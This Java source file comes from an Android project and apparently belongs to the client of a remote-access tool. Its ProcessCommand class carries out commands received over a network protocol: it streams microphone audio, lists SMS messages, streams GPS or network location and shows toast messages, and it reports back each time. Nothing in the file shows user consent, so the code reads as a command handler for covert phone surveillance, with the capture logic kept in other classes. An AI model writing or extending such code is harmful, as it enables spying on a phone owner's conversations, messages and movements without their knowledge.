package Cliente;

import android.content.Intent;
import android.content.SharedPreferences;
import android.widget.Toast;

import java.nio.ByteBuffer;

import Controlador.Protocolo;
import Libreria.Audio;
import Libreria.GPSListener;
import Libreria.SMSListener;

/**
 * Created by Vero on 19/05/2015.
 */
public class ProcessCommand {
    short comm;
    ClientListener client;
    int chan;
    ByteBuffer arguments;
    Intent intent;

    SharedPreferences settings;
    SharedPreferences.Editor editor;

    public ProcessCommand(ClientListener c) {
        this.client = c;
        settings = client.getSharedPreferences("preferences.xml", 0);
        editor = settings.edit();
    }

    public void process(short cmd, byte[] args, int chan) {
        this.comm = cmd;
        this.chan = chan;
        this.arguments = ByteBuffer.wrap(args);
        if (comm == Protocolo.GET_SOUND_STREAM)
        {
            client.sendInformation("Audio streaming request received");
            client.audioStreamer = new Audio(client, arguments.getInt(), chan);
            client.audioStreamer.run();
        } else if (comm == Protocolo.STOP_SOUND_STREAM) {
            client.audioStreamer.stop();
            client.audioStreamer = null;
            client.sendInformation("Audio streaming stopped");
        } else if (comm == Protocolo.DO_TOAST)
        {
            client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
            client.toast.show();

        } else if (comm == Protocolo.GET_SMS)
        {
            client.sendInformation("SMS list request received");
            if(!SMSListener.listSMS(client, chan, arguments.array()))
                client.sendError("No SMS match for filter");

        }else if (comm == Protocolo.GET_GPS_STREAM)
        {
            String provider = new String(arguments.array());

            if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
                client.gps = new GPSListener(client, provider, chan);
                client.sendInformation("Location request received");
            }
            else
                client.sendError("Unknown provider '"+provider+"' for location");

        } else if (comm == Protocolo.STOP_GPS_STREAM)
        {
            client.gps.stop();
            client.gps = null;
            client.sendInformation("Location stopped");

        }

    }
}
